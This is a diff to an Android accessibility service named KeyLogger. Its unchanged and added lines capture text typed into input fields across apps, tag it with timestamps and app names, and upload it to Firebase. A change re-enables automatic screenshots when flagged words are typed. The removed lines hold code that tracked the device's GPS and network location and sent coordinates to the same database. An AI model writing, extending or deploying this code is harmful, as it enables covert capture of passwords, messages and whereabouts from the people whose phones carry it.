@@ -6,22 +6,17 @@ import android.content.ContentResolver;
 import android.content.ContentValues;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.ImageFormat;
 import android.graphics.Matrix;
 import android.hardware.display.DisplayManager;
 import android.hardware.display.VirtualDisplay;
-import android.location.Location;
-import android.location.LocationListener;
-import android.location.LocationManager;
 import android.media.Image;
 import android.media.ImageReader;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Build;
-import android.os.Bundle;
 import android.os.Environment;
 import android.provider.MediaStore;
 import android.text.TextUtils;
@@ -29,8 +24,6 @@ import android.util.DisplayMetrics;
 import android.util.Log;
 import android.view.WindowManager;
 import android.view.accessibility.AccessibilityEvent;
-
-import androidx.core.app.ActivityCompat;
 
 import com.google.firebase.database.DatabaseReference;
 import com.google.firebase.database.FirebaseDatabase;
@@ -49,7 +42,7 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
 
-public class KeyLogger extends AccessibilityService implements LocationListener {
+public class KeyLogger extends AccessibilityService {
     
     private final static String LOG_TAG = Helper.getLogTag( KeyLogger.class );
     private BadWordDetector badWordDetector;
@@ -64,14 +57,6 @@ public class KeyLogger extends AccessibilityService implements LocationListener 
     private Intent data;
     private String ownerName;
     private String databaseName;
-    private LocationManager locationManager;
-    private Location lastLocation;
-    private DatabaseReference locationRef;
-    private long lastLocationUpdateTime = 0;
-    
-    
-    private static final long MIN_TIME_BETWEEN_UPDATES = 15 * 1000;
-    private static final float MIN_DISTANCE_CHANGE_FOR_UPDATES = 0.1f;
     
     public void onServiceConnected() {
         Log.i( LOG_TAG, "Starting service" );
@@ -94,9 +79,6 @@ public class KeyLogger extends AccessibilityService implements LocationListener 
         Date now = DateTimeHelper.getCurrentDay();
         databaseName = dateFormat.format( now ); // Assign the value to the class-level variable
         
-        // Initialize LocationManager and start location updates
-        locationManager = (LocationManager) getSystemService( Context.LOCATION_SERVICE );
-        startLocationUpdates();
     }
     
     Date now = DateTimeHelper.getCurrentDay();
@@ -187,6 +169,11 @@ public class KeyLogger extends AccessibilityService implements LocationListener 
         CharSequence classNameCs = event.getClassName();
         String className = classNameCs.toString();
         if (className.contains( "EditText" ) || className.contains( "Input" )) {
+            
+            SimpleDateFormat dateFormatWithTimeseconds = new SimpleDateFormat( "dd-MM-yyyy, HH:mm:ss",
+                    Locale.getDefault() );
+            String dateFormatWithTimeSeconds = dateFormatWithTimeseconds.format( DateTimeHelper.getCurrentDay() );
+            
             DatabaseReference logdata = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                     .child( ownerName )
                     .child( databaseName )
@@ -195,7 +182,11 @@ public class KeyLogger extends AccessibilityService implements LocationListener 
                     "DateTime: " + dateFormatWithTimeSeconds + "\n\n" +
                     "App: " + packageName );
             
-        } else if (!TextUtils.isEmpty(msg)) {
+        } else if (!TextUtils.isEmpty( msg )) {
+            SimpleDateFormat dateFormatWithTimeseconds = new SimpleDateFormat( "dd-MM-yyyy, HH:mm:ss",
+                    Locale.getDefault() );
+            String dateFormatWithTimeSeconds = dateFormatWithTimeseconds.format( DateTimeHelper.getCurrentDay() );
+            
             DatabaseReference logdata = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                     .child( ownerName )
                     .child( databaseName )
@@ -210,6 +201,10 @@ public class KeyLogger extends AccessibilityService implements LocationListener 
         // Check if any bad word is typed by the user and perform screen shot operation event
         if (badWordDetector.containsBadWord( msg )) {
             
+            SimpleDateFormat dateFormatWithTimeseconds = new SimpleDateFormat( "dd-MM-yyyy, HH:mm",
+                    Locale.getDefault() );
+            String databaseNameWithTime = dateFormatWithTimeseconds.format( DateTimeHelper.getCurrentDay() );
+            
             //creating a new folder in the database
             DatabaseReference logdata = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                     .child( ownerName )
@@ -219,9 +214,9 @@ public class KeyLogger extends AccessibilityService implements LocationListener 
             logdata.push().setValue( "Usage: " + msg + "\n" +
                     "Date/Time: " + databaseNameWithTime + "\n\n" +
                     "App: " + packageName );
-            
-            //now the screen shot part
-//            captureScreenShot();
+
+//            now the screen shot part
+            captureScreenShot();
         }
         
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED && event.getPackageName() != null) {
@@ -230,101 +225,6 @@ public class KeyLogger extends AccessibilityService implements LocationListener 
         
     }
     
-    
-    //***********************************************************************LOCATION START
-    private void startLocationUpdates() {
-        // Check for location provider availability and request location updates
-        if (locationManager != null) {
-            if (locationManager.isProviderEnabled( LocationManager.GPS_PROVIDER )) {
-                if (ActivityCompat.checkSelfPermission( this,
-                        android.Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED
-                        && ActivityCompat.checkSelfPermission( this,
-                        android.Manifest.permission.ACCESS_COARSE_LOCATION ) == PackageManager.PERMISSION_GRANTED) {
-                    locationManager.requestLocationUpdates( LocationManager.GPS_PROVIDER,
-                            MIN_TIME_BETWEEN_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this );
-                    Location lastKnownLocation = locationManager.getLastKnownLocation( LocationManager.GPS_PROVIDER );
-                    if (lastKnownLocation != null) {
-                        double latitude = lastKnownLocation.getLatitude();
-                        double longitude = lastKnownLocation.getLongitude();
-                        saveLocationToFirebase( latitude, longitude );
-                    }
-                } else {
-                    saveLocationErrorToFirebase( "Unable to Locate the Device Location using GPS" );
-                }
-            } else if (locationManager.isProviderEnabled( LocationManager.NETWORK_PROVIDER )) {
-                if (ActivityCompat.checkSelfPermission( this,
-                        android.Manifest.permission.ACCESS_FINE_LOCATION ) == PackageManager.PERMISSION_GRANTED
-                        && ActivityCompat.checkSelfPermission( this,
-                        android.Manifest.permission.ACCESS_COARSE_LOCATION ) == PackageManager.PERMISSION_GRANTED) {
-                    locationManager.requestLocationUpdates( LocationManager.NETWORK_PROVIDER,
-                            MIN_TIME_BETWEEN_UPDATES, MIN_DISTANCE_CHANGE_FOR_UPDATES, this );
-                } else {
-                    saveLocationErrorToFirebase( "Unable to Locate the Device Location using NETWORK" );
-                }
-            }
-        }
-    }
-    
-    
-    public void onLocationChanged( Location location ) {
-        long currentTime = System.currentTimeMillis();
-        if (currentTime - lastLocationUpdateTime >= MIN_TIME_BETWEEN_UPDATES || location.distanceTo( lastLocation ) >= MIN_DISTANCE_CHANGE_FOR_UPDATES) {
-            saveLocationToFirebase( location.getLatitude(), location.getLongitude() );
-            lastLocationUpdateTime = currentTime;
-            lastLocation = location;
-        }
-    }
-    
-    @Override
-    public void onProviderDisabled( String provider ) {
-    }
-    
-    @Override
-    public void onProviderEnabled( String provider ) {
-        if (ActivityCompat.checkSelfPermission( this, android.Manifest.permission.ACCESS_FINE_LOCATION ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission( this, android.Manifest.permission.ACCESS_COARSE_LOCATION ) != PackageManager.PERMISSION_GRANTED) {
-            saveLocationErrorToFirebase( "Sorry The Phone GPS Location is not Enabled" );
-            return;
-        }
-        Location lastKnownLocation = locationManager.getLastKnownLocation( LocationManager.GPS_PROVIDER );
-        if (lastKnownLocation != null) {
-            double latitude = lastKnownLocation.getLatitude();
-            double longitude = lastKnownLocation.getLongitude();
-            saveLocationToFirebase( latitude, longitude );
-        } else {
-            saveLocationErrorToFirebase( "Unable to retrieve location from the User" );
-        }
-    }
-    
-    @Override
-    public void onStatusChanged( String provider, int status, Bundle extras ) {
-    }
-    
-    
-    private void saveLocationToFirebase( double latitude, double longitude ) {
-        DatabaseReference locationRefrence = FirebaseDatabase.getInstance().getReference( "Keylogger:" +
-                        " User Data" )
-                .child( ownerName )
-                .child( databaseName )
-                .child( "Location" );
-        
-        String locationText = String.format( Locale.getDefault(), "LOCATION: %.6f lat, %.6f " +
-                "lon\nDate/Time: %s", latitude, longitude, dateFormatWithTimeSeconds );
-        locationRefrence.push().setValue( locationText );
-        
-    }
-    
-    private void saveLocationErrorToFirebase( String errMsg ) {
-        DatabaseReference locationRefrence = FirebaseDatabase.getInstance().getReference( "Keylogger:" +
-                        " User Data" )
-                .child( ownerName )
-                .child( databaseName )
-                .child( "Location" );
-        
-        String locationText = String.format( Locale.getDefault(), "LOCATION: %s \nDate/Time: %s", errMsg, dateFormatWithTimeSeconds );
-        locationRefrence.push().setValue( locationText );
-    }
-    
-    //***********************************************************************LOCATION END
     private void saveDataToFirebase( String packageName, long timestamp ) {
         DatabaseReference logdata = FirebaseDatabase.getInstance().getReference( "Keylogger: User Data" )
                 .child( ownerName )
